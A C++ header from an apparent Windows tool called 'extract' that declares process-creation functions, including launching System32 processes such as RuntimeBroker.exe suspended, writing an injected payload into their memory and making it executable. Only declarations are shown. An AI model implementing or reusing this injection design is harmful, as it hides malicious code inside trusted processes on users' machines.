#ifndef CORE_EXTRACT_EXECUTION_CREATE_PROCESS_H_
#define CORE_EXTRACT_EXECUTION_CREATE_PROCESS_H_

#include <Windows.h>
#include <string>
#include <vector>

namespace extract {

/**
 * @brief Process creation flags and options
 */
enum class ProcessCreationFlags {
    NORMAL = 0,
    SUSPENDED = CREATE_SUSPENDED,
    DEBUG = DEBUG_PROCESS,
    NO_WINDOW = CREATE_NO_WINDOW
};

/**
 * @brief Process creation result structure
 */
struct ProcessInfo {
    HANDLE process_handle;
    HANDLE thread_handle;
    DWORD process_id;
    DWORD thread_id;
    bool success;

    ProcessInfo() : process_handle(NULL), thread_handle(NULL), 
                   process_id(0), thread_id(0), success(false) {}
};

/**
 * @brief Create a new process with specified options
 * @param executable_path Path to the executable
 * @param command_line Optional command line arguments
 * @param flags Process creation flags
 * @param inherit_handles Whether to inherit handles
 * @return ProcessInfo structure containing process details
 */
ProcessInfo create_process(
    const std::string& executable_path,
    const std::string& command_line = "",
    ProcessCreationFlags flags = ProcessCreationFlags::NORMAL,
    bool inherit_handles = false);

/**
 * @brief Create a process and inject payload
 * @param executable_path Path to the executable
 * @param payload Payload to inject
 * @param flags Process creation flags
 * @return ProcessInfo structure containing process details
 */
ProcessInfo create_process_with_payload(
    const std::string& executable_path,
    const std::vector<uint8_t>& payload,
    ProcessCreationFlags flags = ProcessCreationFlags::SUSPENDED);

/**
 * @brief Create a process from System32
 * @param process_name Name of the process (e.g., "RuntimeBroker.exe")
 * @param flags Process creation flags
 * @return ProcessInfo structure containing process details
 */
ProcessInfo create_system_process(
    const std::string& process_name,
    ProcessCreationFlags flags = ProcessCreationFlags::NORMAL);

namespace process_internal {
    /**
     * @brief Write payload to process memory
     * @param process_handle Handle to target process
     * @param payload Payload to write
     * @param out_address Output parameter for payload address
     * @return true if successful
     */
    bool write_process_memory(
        HANDLE process_handle,
        const std::vector<uint8_t>& payload,
        void*& out_address);

    /**
     * @brief Set memory protection for payload
     * @param process_handle Handle to target process
     * @param address Address of memory to protect
     * @param size Size of memory region
     * @param protection Desired protection
     * @return true if successful
     */
    bool protect_process_memory(
        HANDLE process_handle,
        void* address,
        size_t size,
        DWORD protection = PAGE_EXECUTE_READ);
}

} // namespace extract

#endif // CORE_EXTRACT_EXECUTION_CREATE_PROCESS_H_ 